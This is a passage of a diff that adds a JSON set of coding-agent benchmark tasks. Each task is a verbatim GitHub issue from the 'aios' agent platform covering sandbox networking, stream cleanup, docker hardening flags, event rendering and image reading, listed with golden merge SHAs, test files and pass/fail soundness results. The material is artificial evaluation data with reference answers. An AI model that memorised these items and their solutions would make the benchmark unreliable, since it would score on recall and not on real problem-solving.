+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (2 failed, 1 passed in 0.57s))"
+  },
+  {
+   "id": "s11",
+   "pr": 1032,
+   "issue": 1022,
+   "task": "gVisor networking: sidecar iptables must use legacy backend under runsc (nft unsupported) + unrestricted-mode DNS failure\n\n## Problem (empirical, [battery run 27441532832](https://github.com/eumemic/aios/actions/runs/27441532832))\nUnder `AIOS_SANDBOX_RUNTIME=runsc`, the docker e2e shard fails 4/237 \u2014 all networking-rooted (ops#160 risk 1; gates any prod runsc flip):\n1. **Limited networking**: the netns sidecar's `iptables` invocation fails inside the runsc netns \u2014 `iptables: Failed to initialize nft: Protocol not supported`. gVisor's netstack implements legacy netfilter, NOT nftables; debian/ubuntu images default `iptables` to the nft backend. Fail-closed engages correctly (provision refuses), so this is availability-not-security.\n2. **Unrestricted networking**: `curl` exits 6 (DNS resolution failure) in a runsc sandbox \u2014 even passthrough mode doesn't resolve. Likely the embedded-resolver/bridge-DNS path differs under gVisor's netstack (`_EMBEDDED_DNS_ADDRESS` handling in `src/aios/sandbox/setup.py`).\n3. Downstream: `test_env_var_placeholder_materialized` + `test_run_env_var_placeholder` fail with KeyError 'stdout' (error-shaped tool result after provision failure) \u2014 they recover for free when 1-2 fix.\n\n## Implementation\n- In the sidecar script path (`src/aios/sandbox/setup.py` \u2014 `build_iptables_script` / the apply script around :350-365): detect-or-force the legacy backend when the target runtime is runsc \u2014 committed approach: **always invoke `iptables-legacy` explicitly in the sidecar script** if present (`command -v iptables-legacy`), falling back to `iptables` (runc hosts whose images lack the legacy binary keep working; gVisor gets legacy). The sidecar image = `settings.docker_image` \u2014 verify it ships `iptables-legacy` (it's in debian's iptables package as an alternative); if absent, add it to the sandbox image build.\n- The read-back verify script (`_LOCKDOWN_VERIFY_SCRIPT`) must use the same binary selection \u2014 apply and verify must agree.\n- **Unrestricted DNS**: reproduce in the battery (a runsc sandbox without Limited policy, `getent hosts example.com`); diagnose whether gVisor needs the embedded resolver written even for unrestricted mode, or whether Docker's 127.0.0.11 embedded DNS is unreachable through gVisor netstack and needs a host-gateway resolver instead. Commit the minimal fix the diagnosis supports; if it forks into a real design question (e.g. per-runtime resolver config), ESCALATE.\n- Validation: the gvisor-validation workflow IS the test rig \u2014 push to a branch, `gh workflow run gvisor-validation.yml --ref <branch>` (add `workflow_dispatch` ref support if needed), iterate until 237/237. Zero prod risk; default stays runc.\n\n## Test strategy\nUnit: sidecar script contains the legacy-binary selection (extend `tests/unit/sandbox` argv/script assertions); both apply and verify scripts use the same binary. E2E: the battery green at 237 passed is the acceptance \u2014 link the green run on this issue and on eumemic-ops#160.\n\n---\n**Escalation contract:** If during implementation you hit a design decision this issue body does not settle (interface shape, behavioral tradeoff, schema choice, anything you'd want reviewed), do NOT pick an answer and continue. Stop, post an issue comment starting with `ESCALATION:` stating the question, the options you see, and your recommendation, add the `escalated` label to the issue, then exit. An escalated stop is a success mode, not a failure.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "4928f56f7c29366e5784adb07a1f78b6bfc87703",
+   "merge_sha": "d6afa90f20b2def1f832db7251de085fc4a37e83",
+   "src_files": [
+    "src/aios/sandbox/setup.py"
+   ],
+   "test_files": [
+    "tests/unit/test_networking.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (11 failed, 41 passed in 0.69s))"
+  },
+  {
+   "id": "s12",
+   "pr": 975,
+   "issue": 855,
+   "task": "WP-16: Close the abandoned LiteLLM stream on inter-chunk timeout\n\n**Severity:** Low \u00b7 **Complexity:** S \u00b7 **Recommended executor:** cheap agent \u00b7 **Theme:** Sweep/wake engine (error path)\n\n*From the June 2026 production-readiness audit. Anchors re-verified at `b391b5c4` (2026-06-11 triage).*\n\n---\n\n**Goal.** E5 \u2014 an abandoned stream leaks an open provider HTTP connection until GC on every stalled stream.\n\n**Why it matters.** When the inter-chunk guard (or TTFT guard) fires, `TimeoutError` propagates out of `stream_litellm` with no close of `response` \u2014 the litellm `CustomStreamWrapper` + its httpx streaming response is dropped. A burst of stalls on a flapping provider accumulates sockets in the single worker process, and the retry ladder opens fresh ones on top.\n\n**Scope.**\n> **Supersedes the 2026-06-10 \"timeout/refusal\" framing of the Goal because PR #797 (merged 2026-06-10) made refusals drain the stream instead of abandoning it.**\n\nClose on `TimeoutError` + any in-loop exception \u2014 any non-`StopAsyncIteration` exit. At `b391b5c4`, `content_filter` is handled sticky (`saw_content_filter`) and the stream fully drains, so refusal is NOT an abandon path anymore.\n\n**Anchors (verified at `b391b5c4`).** `src/aios/harness/completion.py` \u2014 `response = await litellm.acompletion(**kwargs)` at `:554`; `aiter = response.__aiter__()` at `:567`; chunk loop `:580-601`; the sole clean exit is the `StopAsyncIteration` \u2192 `break` at `:585`.\n\n**Committed mechanism (single approach).** Wrap the chunk loop in `try/finally`; in the `finally`, best-effort close: `with contextlib.suppress(Exception): await response.aclose()`. (Not `contextlib.aclosing` \u2014 the loop drives the iterator manually via `aiter.__anext__()`, so an explicit `finally` matches the existing style; closing after a normal full drain is a harmless no-op, so the `finally` is unconditional.)\n\n**Acceptance criteria.**\n- Any non-`StopAsyncIteration` exit from the chunk loop awaits `response.aclose()` (exceptions from the close itself suppressed); the original exception still propagates.\n- A unit test asserts the stream is closed on inter-chunk timeout.\n\n**Tests/commands.** Extend `tests/unit/test_completion_timeouts.py` (6 existing tests cover the timeout paths \u2014 add a fake stream recording `aclose()` calls; assert closed on inter-chunk timeout and on mid-stream exception, and that a fully-drained stream is also closed without error). `uv run pytest tests/unit/test_completion_timeouts.py -q`.\n\n---\n\n**Escalation contract:** If during implementation you hit a design decision this issue body does not settle (e.g. the pinned litellm version's wrapper lacks `aclose`), do NOT pick an answer and continue. Stop, post an issue comment starting with `ESCALATION:` stating the question, options, and your recommendation \u2014 then exit. An escalated stop is a success mode, not a failure.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "bfe71d44845f39e43cad9b7985f1bc39320b9b75",
+   "merge_sha": "37196ce14823c7b257fb82aa73b656ebbccc40d7",
+   "src_files": [
+    "src/aios/harness/completion.py"
+   ],
+   "test_files": [
+    "tests/unit/test_completion_timeouts.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 5 passed in 1.56s))"
+  },
+  {
+   "id": "s13",
+   "pr": 914,
+   "issue": 826,
+   "task": "Worker liveness touch assumes container paths: /var/run/aios-worker-alive EACCES on host + warning every 15s\n\nRunning \\`uv run aios worker\\` on the host (lean mode) logs \\`heartbeat.touch_failed [Errno 13] /var/run/aios-worker-alive\\` every 15s forever: the liveness path is only writable by the container user. Two defects: (1) log spam drowns real warnings; (2) the liveness file silently never exists, so anything consuming it (compose healthcheck pattern) would see a dead worker. Fall back to a user-writable path (instance dir / $TMPDIR) or disable the touch outside containers.\n\nCEO-on-aios v0 PoC (2026-06-10), dogfood entry 27.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "594a28510e797b3bfe27d0e982a1088e2fac0b67",
+   "merge_sha": "e7ae78160d27095ef6d944e448ee3a27178f4270",
+   "src_files": [
+    "src/aios/harness/worker.py"
+   ],
+   "test_files": [
+    "tests/unit/test_worker_heartbeat.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 3 passed in 0.78s))"
+  },
+  {
+   "id": "s14",
+   "pr": 812,
+   "issue": 804,
+   "task": "[WS0-3] Sandbox docker-run flags safe pre-seam: --security-opt no-new-privileges + --ipc private\n\n## Problem\nWS0 hardening (roadmap) includes `no-new-privileges` and `--ipc=private`. Per-phase analysis shows these two are safe to land TODAY, before the exec-user seam, while `--cap-drop=ALL` and `--read-only` are NOT (they interact with apt/dpkg and root-agent writes \u2014 separate issues).\n\nWhy these two are safe with the current all-root container:\n- `no-new-privileges` only blocks privilege GAIN across execve (setuid/file-caps). Root setup execs don't escalate: apt's `_apt` sandbox drop uses `seteuid()` downward via CAP_SETUID (unaffected); the Limited iptables lockdown (`src/aios/sandbox/setup.py:191-231`, applied at `setup.py:264-266`) runs as root already holding NET_ADMIN from `--cap-add` (`src/aios/sandbox/backends/docker.py:88-90`) \u2014 no escalation path involved. No setuid binaries (sudo/ping) ship in `docker/Dockerfile.sandbox`.\n- `--ipc=private` drops SysV-shm/POSIX-mq sharing; nothing in the sandbox uses cross-container IPC.\n\n## Approach (single)\nIn `DockerBackend.create` (`src/aios/sandbox/backends/docker.py:62-135`), unconditionally append to argv:\n```\n--security-opt no-new-privileges --ipc private\n```\nPlace adjacent to the existing NET_ADMIN conditional with a comment explaining the per-phase analysis above and pointing at the follow-up issues for cap-drop/read-only/seccomp.\n\n## Files\n- `src/aios/sandbox/backends/docker.py` \u2014 argv additions.\n- `tests/unit/sandbox/` \u2014 existing docker-backend argv tests: extend to assert both flags present.\n\n## Test strategy\n- Unit: argv construction includes both flags for Full and Limited specs.\n- E2E (existing suites): a Limited-networking provision must still succeed end-to-end (lockdown fail-closed path `setup.py:287-291` would abort the provision if NNP broke iptables \u2014 so a green Limited e2e IS the regression test); an env with `packages.apt` must still install.\n\n## Residual caveats\n- Any future setuid binary added to the sandbox image will silently not escalate under NNP \u2014 acceptable and intended; note it in the Dockerfile comment.\n- `--ipc private` is the modern Docker default on most daemons; setting it explicitly is an assertion, not a behavior change \u2014 zero expected impact.\n\n---\n_WS0 hardening decomposition 2026-06-09 (design: eumemic-company strategy/reviews). Gating: WS6-gating. Blocked-by: none. Strategy parent: eumemic-company#11._",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "0de0ba54a482ce3490cc4968a213daee0daccc0a",
+   "merge_sha": "02516fd740d1bf06f103926240adaa4531cffe65",
+   "src_files": [
+    "src/aios/sandbox/backends/docker.py"
+   ],
+   "test_files": [
+    "tests/unit/test_networking.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 32 passed in 0.56s))"
+  },
+  {
+   "id": "s15",
+   "pr": 802,
+   "issue": 686,
+   "task": "harness/context: build_messages replays the full window every wake \u2014 one un-renderable event permanently bricks the session\n\n## Summary\n\n`build_messages` and the `render_*` helpers it drives are a pure replay over the **immutable** event log, executed on the hot path of **every** wake. Because events never change (monotonicity invariant) and every future wake re-renders the same window, a single event that makes the renderer raise an unhandled exception **permanently bricks the session**: the model is never called, so the system's \"model sees the error and retries\" recovery cannot engage. The mitigation today is a growing pile of reactive `try/except` guards added one production brick at a time.\n\n## Evidence\n\n- Replay-on-every-wake: step body (`harness/loop.py`) \u2192 `compose_step_context` \u2192 `build_messages` (`harness/context.py:613`). Pure function of the log; runs each step.\n- The renderer does host I/O + CPU inline on that path: `harness/context.py:415` (`host_path.read_bytes()`) and `:431` (`base64.b64encode`) in `_apply_attachments`.\n- Reactive \"brick the session permanently\" guards already present, each from a real incident:\n  - `context.py:122-133` \u2014 `timestamp_ms` out of range makes `datetime.fromtimestamp` raise (comment cites #446: *\"an unguarded raise bricks the session permanently\"*).\n  - `context.py:370-383` \u2014 a non-dict attachment record would crash `record.get(...)`.\n  - `context.py:414-426` \u2014 staged attachment file vanished (`read_bytes` `OSError`).\n- These guards share one rationale verbatim: *\"the renderer runs on every wake, so an unguarded raise bricks the session.\"* That's a structural property, not three coincidences.\n\n## Why it matters\n\n- **Blast radius:** one dead session per poison event \u2014 unrecoverable without a code deploy that adds the matching guard.\n- **Self-inflicted, philosophy-violating:** \"fail hard, the model retries\" assumes the model gets *called*. A render-time raise fails *before* inference, so there's no retry path \u2014 just a wedged session.\n- **Whack-a-mole trajectory:** every new event shape (new connector metadata field, attachment variant, tool-result content shape) is a candidate for the next brick. The guard list grows monotonically; the bug *class* is never structurally closed.\n\n## Candidate directions (design decision \u2014 not settled)\n\n1. **Poison-event quarantine.** Wrap per-event rendering so a raise degrades *that one event* to a safe placeholder (e.g. `[unrenderable event seq=N]`) + an ops-log signal, instead of failing the whole build. Closes the class structurally; the model keeps running.\n2. **Render-at-append, persist the rendered form.** Move rendering to append time (once) and store the chat-completions message; build becomes concatenation. Removes replay cost entirely but is larger and interacts with vision/model-dependent rendering (append-time rendering already exists for token-counting but isn't vision-aware \u2014 see the `TODO(vision)` in `append_event`, `db/queries.py:1859`).\n3. **Status quo + fuzz.** Keep patching, but add a property/fuzz test over `render_user_event` with adversarial metadata to find the next brick before prod does. Cheapest; doesn't close the class.\n\nPairs with the sibling issue on non-durable async tool execution (both are recovery-correctness on the replay path).\n\n---\n\n## Implementation (Direction 1 \u2014 poison-event quarantine; chosen by roadmap \u00a77.1 WS6 gate, 2026-06-09)\n\n**Single approach.** In `src/aios/harness/context.py` `build_messages` (the `for e in events:` loop, ~line 760), wrap the per-event render dispatch \u2014 the `render_user_event` call (~line 762) and the assistant/tool branches that touch `e.data` \u2014 in try/except. On any exception, emit a deterministic placeholder user message `[unrenderable event seq=<e.seq> \u2014 quarantined]` (function of `e.seq` only, preserving the log-monotonicity invariant documented at module top) instead of propagating, and emit a structured signal `structlog ... context.poison_event_quarantined` with `session_id` + `seq` + exception type so quarantines are observable. One poison event quarantines exactly one position; all other events in the window still render.\n\n**Files:** `src/aios/harness/context.py` only. Precedent for placeholder/log style: context.py:122-133 (#649) and the #446 guard.\n\n**Test strategy:** (1) unit test feeding `build_messages` an event that triggers each of the three known historical raises (out-of-range timestamp_ms; non-dict attachment record; vanished staged-file path) plus a synthetic novel-shape raiser \u2014 assert the returned message list carries a `[unrenderable event seq=...]` placeholder at that position and does NOT raise; (2) assert all OTHER events in the same window render normally; (3) a property/fuzz test over `render_user_event` with adversarial metadata confirming `build_messages` never raises.\n\n_Spec lifted into body for autodev (reads body only). CEO, 2026-06-09._",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "a49c38b290725a5333986926d06a6a01749a8361",
+   "merge_sha": "262f1c9926ef692faefa405b4942a5c05266bddb",
+   "src_files": [
+    "src/aios/harness/context.py"
+   ],
+   "test_files": [
+    "tests/unit/test_context.py",
+    "tests/unit/test_context_attachments.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [env-broke-at-base (collection/import)] (ENV-SKIP (1 error in 0.33s))"
+  },
+  {
+   "id": "s16",
+   "pr": 721,
+   "issue": 718,
+   "task": "harness/context: inbound attachments on a non-focal channel are silently dropped (not inlined, no marker) \u2014 permanent due to immutable focal_channel_at_arrival\n\n## Symptom\n\nAn image (or any attachment) sent to a connector channel is **silently dropped from the agent's context** \u2014 never inlined as an `image_url`, not even surfaced as a text marker referencing the file \u2014 whenever it arrives while a *different* channel is focal. Because `focal_channel_at_arrival` is stamped at append time and is **immutable**, switching to that channel afterward does **not** recover the image: the agent can never see it. The only workaround is to resend the image while the target channel is focal.\n\nThis makes cross-agent visual QA unreliable: when one agent posts a screenshot to a shared channel for another agent to eyeball, the screenshot is invisible to the recipient unless that channel happened to be their focal channel at the instant the message landed.\n\n## Root cause\n\n`src/aios/harness/context.py` (the user-event renderer, ~line 334):\n\n```python\nif orig_channel == focal_channel_at_arrival:\n    if metadata:\n        ...\n        attachments = metadata.get(\"attachments\")\n        if isinstance(attachments, list) and attachments:\n            _apply_attachments(msg, attachments, model=..., session_id=..., workspace_path=...)\n    return msg\n\n# Otherwise (focal is NULL, or focal differs from orig):\nmarker = _format_notification_marker(orig_channel, metadata, content)\nreturn {\"role\": \"user\", \"content\": marker}\n```\n\nThe non-focal branch builds a one-line notification marker from `orig_channel`, `sender`, and a truncated text preview \u2014 and **never calls `_apply_attachments`**. So the attachment metadata is discarded for rendering. `_format_notification_marker` does not even emit the `[image: \u2026 at <path>]` marker that `_apply_attachments` would produce on a failed inline gate \u2014 there is no breadcrumb the model could act on. The image is simply gone from context.\n\nCombined with the immutability of `focal_channel_at_arrival` (stamped at append; `build_messages` is a pure function of the log), the drop is permanent for that event.\n\n## Evidence it fires in practice (not just latent)\n\nLive session `sess_01KQ8NQ3HP4XB9D0F4GW9JKYWF` (metals-factchecker / Ultron), 2026-06-01/02. Of the most recent 40 inbound messages carrying attachments, **3 arrived with `orig_channel != focal_channel_at_arrival`** and were therefore dropped to markers:\n\n| seq | time (UTC) | sender | channel | focal_match |\n|---|---|---|---|---|\n| 236998 | 06-02 00:58 | Jarvis | signal | **false** |\n| 233447 | 06-01 22:47 | Jarvis | signal | **false** |\n| 232928 | 06-01 22:09 | David  | telegram| **false** |\n\nThe first two are screenshots another agent (Jarvis) posted to the shared Metals channel for Ultron to QA \u2014 exactly the cross-agent visual-QA path that this breaks. (The remaining 37 were focal-matched and inlined normally, confirming the inline path itself works \u2014 this is specifically the non-focal case.)\n\n## Fix options (pick one; design decision)\n\nThe tension: the notification-marker design deliberately keeps non-focal *text* terse so off-channel chatter doesn't flood context. That rationale doesn't extend to **attachments** \u2014 dropping an image entirely is a data loss, not a verbosity trade.\n\n1. **Emit the attachment marker even on the non-focal path** (smallest change). In the non-focal branch, still run attachment handling but force the text-marker form (`text_marker(record)` from `harness/vision.py`) so the model at least sees `[image: foo.jpg (image/jpeg, 74KB) at /mnt/attachments/...]` and can choose to `read` it. Doesn't inline pixels, but ends the silent loss and gives a recovery path. (Requires #715-style magic-byte handling for extension-less paths to be fully useful via `read`.)\n\n2. **Inline non-focal images too** (most user-friendly). Call `_apply_attachments` on the non-focal branch as well, so an image is always visible regardless of focal state. Cost: context-size \u2014 a burst of off-channel images all inline. Could bound by only inlining attachments from the most-recent N non-focal messages, or only when the agent later switches to that channel.\n\n3. **Re-evaluate attachment rendering at switch time.** Since `focal_channel_at_arrival` is immutable, add a render rule: when the *current* focal channel == a past message's `orig_channel`, treat that message as focal for attachment purposes. This recovers images after a `switch_channel` without changing the stamp semantics. More involved; touches the monotonicity reasoning in `build_messages`.\n\nRecommend **option 1** as the floor (stop the silent loss) and consider **option 3** as the follow-up for true cross-channel visual QA. Flag whichever, since this is a product-behavior call.\n\n## Tests\n\n- `test_nonfocal_attachment_emits_marker_not_dropped`: user event with `orig_channel != focal_channel_at_arrival` + an image attachment \u2192 rendered message contains a `[image: \u2026]` marker (option 1) or an `image_url` part (option 2), NOT a bare notification line with the attachment gone.\n- `test_focal_attachment_still_inlines` (regression): focal-matched image still produces `image_url`.\n- (option 3) `test_attachment_recovered_when_orig_channel_becomes_focal`: an image that arrived non-focal becomes visible once the agent's current focal == its `orig_channel`.\n\n## Acceptance\n\n- [ ] A non-focal inbound image is no longer silently dropped \u2014 at minimum a `read`-able marker is emitted (option 1), ideally inlined (option 2/3).\n- [ ] Focal-matched inlining is unchanged (regression test green).\n- [ ] The chosen behavior is documented in the renderer docstring (currently the docstring describes the drop as intended for the notification-marker case without calling out the attachment-loss consequence).\n\n## Related\n\nPart of the vision cluster surfaced 2026-06-01: **#714** (stale litellm catalog \u2192 `supports_vision` false), **#715** (extension-less `read` path dumps bytes). This issue is independent of both \u2014 it fires even with vision working and the file present. All three can co-occur on one image.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "9c8b185e3d57286c1a1b68591eeffc39c8c15f39",
+   "merge_sha": "46ecf2c29c72b08b41b7a24173d94b5785796d35",
+   "src_files": [
+    "src/aios/harness/context.py"
+   ],
+   "test_files": [
+    "tests/unit/test_context.py",
+    "tests/unit/test_context_attachments.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 111 passed in 1.34s))"
+  },
+  {
+   "id": "s17",
+   "pr": 719,
+   "issue": 715,
+   "task": "tools/read: _looks_like_image is extension-only; extension-less inbound attachments fall through to text-read and dump raw bytes\n\n## Symptom\n\nInbound chat attachments (Signal, Telegram) are saved to `/mnt/attachments/<connector>/<filename>` where `<filename>` may have **no extension**. When an agent calls the `read` tool on such a path, `src/aios/tools/read.py:155-156` `_looks_like_image()` checks file extension only:\n\n```python\ndef _looks_like_image(path: str) -> bool:\n    return os.path.splitext(path)[1].lower() in _EXT_TO_MIME\n```\n\nExtension-less paths return `False` \u2192 `read_handler` takes the **text-read** path \u2192 the tool result is the raw image bytes interpreted as UTF-8 text (mostly mojibake from JPEG/PNG headers + binary payload). The agent never gets an `image_url` content block; the model sees ICC profile garbage instead of pixels.\n\n## Concrete miss\n\n2026-06-01 21:55:33\u201321:55:58 UTC, agent `metals-factchecker`, sess_01KQ8NQ3HP4XB9D0F4GW9JKYWF, seq 232723\u2013232769 (Signal Metals channel):\n\n- Seq 232723 \u2014 Tom sends `\"you can't see this ultron?\"` + JPEG (319KB, 2000\u00d71500, image/jpeg). Signal connector saves the file at `/mnt/attachments/signal/signal-6c21718f-\u2026-unnamed` (filename literally `unnamed`, **no extension**). The user-message metadata carries TWO paths: the parent (no extension) AND `\u2026-unnamed.inline.jpg` (auto-downsampled sibling produced by PR #672's downsample-at-staging).\n- Seq 232733 \u2014 Ultron's intent: *\"Tom sent an actual image (jpeg, 311.8KB at /mnt/attachments/signal/\u2026). The honest, verifiable thing to do is actually ATTEMPT to read the image and report exactly what happens.\"* He calls `read(\"/mnt/attachments/signal/\u2026-unnamed\")` \u2014 the **parent** path, not the inline sibling.\n- Seq 232739 \u2014 Tool result is raw JPEG bytes: `{\"content\": \"\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00\u2026ICC_PROFILE\\x00\\x01\u2026\"}` \u2014 exactly the bytes you'd get from `cat` on a JPEG, line-numbered.\n- Seq 232769 \u2014 Ultron's next turn misreads the garbage as *\"no new inbound message yet \u2014 this looks like just a channels listing/orientation. Nothing to respond to. I'll stay quiet.\"* He silently drops Tom's question and moves on.\n\n## Root cause\n\n`src/aios/tools/read.py:155-156` \u2014 extension-only detection at the dispatch site. The function is the gate between the text path and `_read_image`. Connector-staged attachments arrive with arbitrary or no extension; the read path needs a magic-byte fallback when the extension lookup fails.\n\nThe byte-sniffer **already exists** in the codebase: `aios_connector_http.mime.sniff_image_mime` (added by PR #356 closing #342, used at `Attachment.as_params()` SDK boundary and at `_apply_attachments()` renderer). It recognizes PNG, JPEG, GIF magic \u2014 the exact set Anthropic accepts. Re-using it here is a third call site of the same pattern, not new infrastructure.\n\n## Fix\n\n`src/aios/tools/read.py`:\n\n1. In `read_handler` (the dispatch site that picks image vs text based on `_looks_like_image`), when extension-based detection returns False:\n   - Read the first 16 bytes of the file (enough for all three magics).\n   - Call `sniff_image_mime(head)` \u2014 returns None / `\"image/png\"` / `\"image/jpeg\"` / `\"image/gif\"`.\n   - If non-None, route to `_read_image` with the sniffed mime as an explicit parameter.\n   - If None, proceed with the existing text-read path unchanged.\n\n2. `_read_image` currently derives mime at `read.py:167` via `_EXT_TO_MIME[os.path.splitext(path)[1].lower()]`. That call would `KeyError` on extension-less paths. Refactor `_read_image` to accept `mime: str` as a parameter (computed in `read_handler` from either extension or magic-byte sniff). This is the minimal change that lets both code paths converge cleanly.\n\nSketch (apply at the dispatch site in `read_handler`, around the current `_looks_like_image(path)` call):\n\n```python\nmime: str | None = None\next = os.path.splitext(path)[1].lower()\nif ext in _EXT_TO_MIME:\n    mime = _EXT_TO_MIME[ext]\nelse:\n    head = await _read_head_bytes(handle, path, n=16)\n    if head:\n        mime = sniff_image_mime(head)  # returns \"image/png\" | \"image/jpeg\" | \"image/gif\" | None\n\nif mime is not None:\n    return await _read_image(session_id=session_id, path=path, mime=mime, handle=handle, pool=pool)\n# fall through to text path\n```\n\nA `_read_head_bytes(handle, path, n)` helper can follow the `_stat_and_read_via_exec` pattern at `read.py:216-241` but issuing `head -c <n>` instead of full base64 \u2014 pay one docker-exec for sniffing instead of two.\n\n## Tests\n\nAdd to `tests/unit/tools/test_read.py` (or a new file under `tests/e2e/`):\n\n1. `test_read_extensionless_png_inlines_via_magic_byte_sniff` \u2014 write a PNG to `/workspace/unnamed`, read it, assert the tool result contains an `image_url` content part with `image/png`.\n2. `test_read_extensionless_jpeg_inlines_via_magic_byte_sniff` \u2014 same for JPEG (note `\\xff\\xd8\\xff` magic).\n3. `test_read_extensionless_gif_inlines_via_magic_byte_sniff` \u2014 same for GIF (`GIF87a` / `GIF89a`).\n4. `test_read_extensionless_text_falls_through_to_text_path` \u2014 write a text file with no extension to `/workspace/random_name`, read it, assert the content is text (not an image_url part). Verifies no false-positive routing.\n5. `test_read_with_extension_unchanged` (regression) \u2014 write `foo.png`, read it, assert image_url. Document that the extension path doesn't need to read magic bytes.\n6. (e2e ideal) Round-trip via the connector path: simulated Signal connector ingests an attachment to `/mnt/attachments/signal/\u2026-unnamed`, agent reads via the path provided in the user-message metadata, image_url flows through to the model.\n\n## Acceptance\n\n- [ ] Reads of extension-less PNG, JPEG, and GIF files route to `_read_image` and produce `image_url` content parts (tests 1-3).\n- [ ] Reads of extension-less non-image files still produce text content with no false-positive image routing (test 4).\n- [ ] Reads of files with image extensions are unchanged in behavior and code path (test 5).\n- [ ] The PR re-uses `aios_connector_http.mime.sniff_image_mime` rather than introducing a parallel sniffer.\n\n## Related\n\n- **#714** \u2014 companion bug: stale litellm catalog \u2192 `supports_vision=False` for new Claude models. **Both** must land for end-to-end vision on extension-less attachments to work on opus-4-8: this issue fixes path routing, #714 fixes the model-capability lookup.\n- **PR #356 / #342** \u2014 the byte-sniffer being re-used here was added for the SDK boundary + renderer. Same pattern, third site.\n- **PR #672** \u2014 auto-downsample at attachment staging produces the `.inline.jpg` sibling. A UX-side workaround would be for `read` to prefer the inline sibling when present, but that surfaces internal harness naming into the tool surface; the magic-byte fix is cleaner and covers all sources (not just the post-downsample sibling).\n\n## Out of scope\n\n- Changing the connector layer to write attachments with extensions inferred from `content_type`. That's an alternative fix but it has wider blast radius (connector code, attachment-path stability, existing-session compatibility). Patching `read` is the smaller, targeted change.\n- General attachment-handling reform. This issue is narrowly about the `read` tool dispatch.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "4d9c986addd96db07b5183889cc048b7debd8d1d",
+   "merge_sha": "1ef0ec8fc7c4cf3ceeea05ef8313775b5660df05",
+   "src_files": [
+    "src/aios/tools/read.py"
+   ],
+   "test_files": [
+    "tests/unit/test_read_image.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "multi-attempt",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (5 failed, 13 passed in 0.53s))"
+  },
+  {
+   "id": "s18",
+   "pr": 705,
+   "issue": 675,
+   "task": "mcp CLI per-tool --help suggests stale `--json` flag in INVOKE example\n\n## Symptom\n\n`mcp <server> <tool> --help` prints an INVOKE example that uses a `--json` flag, but that flag isn't accepted by the CLI. Running the printed example verbatim errors with \"unknown option: --json\".\n\n## Repro\n\n```\n$ mcp github get_me --help\nTOOL: github get_me\n\nDESCRIPTION:\n  Get details of the authenticated GitHub user. Use this when a request is about the user's own profile for GitHub. Or when information is missing to build other tool calls.\n\nARGUMENTS (JSON Schema):\n{\n  \"type\": \"object\",\n  \"properties\": {}\n}\n\nINVOKE:\n  mcp github get_me --json '{...}'\n```\n\nFollowing the printed example:\n\n```\n$ mcp github get_me --json '{}'\nmcp: unknown option: --json\n```\n\nWorking invocation (positional, matches the system prompt's documented form):\n\n```\n$ mcp github get_me '{}'\n{\"login\":\"eumemic\",\"id\":94939491,...}\n```\n\n## Expected\n\nThe INVOKE example in the per-tool `--help` output should print the positional form that actually works:\n\n```\nINVOKE:\n  mcp github get_me '{...}'\n```\n\n(Or, if `--json` is intended to be supported, accept the flag and document it; but the system prompt's MCP CLI docs use the positional form, so updating the help string is the simpler fix.)\n\n## Scope\n\nStringy fix in whatever generates the per-tool `--help` template. No CLI behavior change needed \u2014 the working invocation form is unchanged.\n\n## Environment\n\nObserved in the Ultron persona's sandbox, 2026-05-23 ~06:35 UTC. `mcp` binary at `/usr/local/bin/mcp`. Same persona that exercised the CLI smoke test (list servers, list tools, get help, invoke) successfully \u2014 the discrepancy is purely in the printed example string.\n\nFiled at Tom's request after I flagged the discrepancy in DM.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "5d6e1bb0c8c0d0cdf7a047ed5937d5f9e1fdbb18",
+   "merge_sha": "84fdaf48b595a8325dfd8cb8509df93db2c871d9",
+   "src_files": [
+    "src/aios/harness/step_context.py"
+   ],
+   "test_files": [
+    "tests/unit/sandbox/conftest.py",
+    "tests/unit/sandbox/test_tool_cli_defaults.py",
+    "tests/unit/sandbox/test_tool_cli_help.py",
+    "tests/unit/test_step_context_mcp_hint.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 21 passed in 0.51s))"
+  },
+  {
+   "id": "s19",
+   "pr": 637,
+   "issue": 633,
